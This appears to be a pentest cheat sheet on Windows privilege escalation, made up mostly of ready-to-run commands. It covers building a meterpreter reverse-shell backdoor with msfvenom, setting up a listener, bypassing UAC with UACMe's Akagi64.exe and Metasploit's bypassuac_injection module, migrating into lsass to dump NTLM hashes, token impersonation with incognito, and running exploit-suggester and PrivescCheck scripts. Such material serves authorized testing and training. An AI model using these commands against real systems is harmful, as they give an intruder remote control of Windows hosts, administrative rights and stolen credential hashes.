# Windows - Privilege Escalation

## Bypassing UAC With UACIMe

**UAC (User Account Control)** is a Windows security features that is used to prevent unauthorized changes from being made to the OS

**UACMe** is an open source, robust privilage escalation tool. It can be used to bypass windows UAC by leveraging varius techniques

```bash
# Create a backdoor with msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > backdoor.exe
```

```bash
# Set up msf listener
service postgresql start && msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST $IP
set LPORT $PORT 
run
```

{% code overflow="wrap" %}
```bash
# Create 'Temp' dir on target machine (best folder for payloads)
cd C:\\
mkdir Temp

# Upload the payload on the Temp dir (meterpreter session)
upload backdoor.exe

# Upload the UACMe tool on the target
# https://github.com/hfiref0x/UACME
upload PATH/TO/UACME/Akagi64.exe

# Open Shell
shell

# Use the tool
.\Akagi64.exe KEY C:\Temp\backdoor.exe
## The key is a flag to decide what type of operation the tool do to bypass UAC (23 is the most used)
```
{% endcode %}

```bash
# shell's been open in msf listener (multi/handler)

# check privilege
getprivs

# Migrate windows privilages 
ps -s lsass.exe 
migrate PID

# Make a NTML hashdump 
hashdump
```

***

{% code title="Metasploit PrivEsc" %}
```bash
service postgresql start && msfconsole
use exploit/windows/local/bypassuac_injection
set payload windows/x64/meterpreter/reverse_tcp
set SESSION SESSION
set LPORT PORT
set TARGET Windows\ x64 
run
```
{% endcode %}

***

## **Access Token Impersionation**

User privs **required**:

* SeAssignPrimaryToken: allows a user to impersonate tokens
* SeCreateToken: allows a user to create an arbitrary token with administrative privileges
* SeImpersonatePrivilege: allowa a user to create a process under the security context of another user, typically with administrative privileges

```bash
# check privs in meterpreter session
getprivs
```

<pre class="language-bash"><code class="lang-bash"># load incognito module
load incognito

<strong># get token list of the target for impersonation
</strong>list_tokens -u

# copy a token from previusly list and impersonate
impersonate_token TOKEN

# get a PID of explorer process
pgrep explorer

# migrate to explorer process PID
migrate PID
</code></pre>



***

## Windows Kernel Exploitation

### Windows Exploit Suggester

{% embed url="https://github.com/bitsadmin/wesng" %}

```bash
# Identify the kernel vulnerabilities by kernel version
# Metasploit
service postgresql start && msfconsole
use multi/recon/local_exploit_suggester
sessions
set SESSION SESSION
run
```

***

## Identifying Windows Privilege Escalation Vulnerabilities

### PrivescCheck Script

{% embed url="https://github.com/itm4n/PrivescCheck" %}

```bash
# After downloading the script and copying it onto the target Windows machine,
# run it using one of the commands below.
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,CSV,HTML,XML"
```
